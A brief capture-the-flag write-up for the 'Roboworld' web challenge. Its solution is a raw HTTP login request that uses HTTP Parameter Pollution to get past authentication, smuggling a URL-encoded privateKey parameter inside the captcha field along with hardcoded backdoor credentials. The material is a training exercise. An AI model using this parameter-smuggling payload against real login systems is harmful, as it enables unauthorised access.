# Roboworld
## Challege
>A friend of mine told me about this website where I can find secret cool stuff. He even managed to leak a part of the source code for me, but when I try to login it always fails :(
>
>Can you figure out what's wrong and access the secret files?

## Vulnerability
[HTTP Parameter Pollution](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004))

## Solution
```HTTP
POST /login HTTP/1.1

Host: challs.xmas.htsp.ro:11000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 112

Origin: http://challs.xmas.htsp.ro:11000

Connection: close

session=eyJsb2dnZWQiOnRydWV9.XfzYLQ.1rg_CZFyi5Z5wgS6KVdLzlB2220;

Referer: http://challs.xmas.htsp.ro:11000/

Upgrade-Insecure-Requests: 1



user=backd00r&pass=catsrcool&captcha_verification_value=anything%26privateKey%3d8EE86735658A9CE426EAF4E26BB0450E
```
